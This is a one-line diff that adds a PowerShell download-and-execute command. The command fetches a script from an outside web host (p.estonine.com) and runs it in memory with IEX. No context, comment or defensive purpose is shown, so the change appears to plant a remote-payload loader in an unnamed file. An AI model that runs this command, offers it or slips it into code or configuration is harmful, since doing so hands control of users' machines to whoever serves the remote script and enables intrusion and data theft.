@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).downloadstring('http://p.estonine.com/p?smb')
